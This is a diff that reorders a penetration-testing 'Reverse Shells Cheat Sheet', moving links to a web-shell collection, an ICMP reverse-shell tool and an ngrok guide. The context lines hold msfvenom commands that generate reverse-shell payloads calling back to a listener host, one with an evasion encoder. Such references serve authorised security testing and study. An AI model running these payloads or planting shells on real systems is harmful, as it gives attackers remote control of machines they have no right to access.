@@ -9,15 +9,6 @@ title: Reverse Shells Cheat Sheet
 ### Online Reverse Shell Generators 
 [https://www.revshells.com/](https://www.revshells.com/)
 
-### Reverse Shell Collections
-[https://github.com/tennc/webshell](https://github.com/tennc/webshell)
-
-### ICMP Reverse Shell
-[https://github.com/krabelize/icmpdoor](https://github.com/krabelize/icmpdoor)
-
-### Reverse Shell over the Internet (NGROK)
-[How to catch a reverse shell over the internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)
-
 ### Upgrate Reverse Shell to Interactive TTYs
 ```bash
 #---Python---
@@ -251,3 +242,12 @@ msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o she
 #Linux C reverse shell
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
 ```
+
+### Reverse Shell Collections
+[https://github.com/tennc/webshell](https://github.com/tennc/webshell)
+
+### ICMP Reverse Shell
+[https://github.com/krabelize/icmpdoor](https://github.com/krabelize/icmpdoor)
+
+### Reverse Shell over the Internet (NGROK)
+[How to catch a reverse shell over the internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)
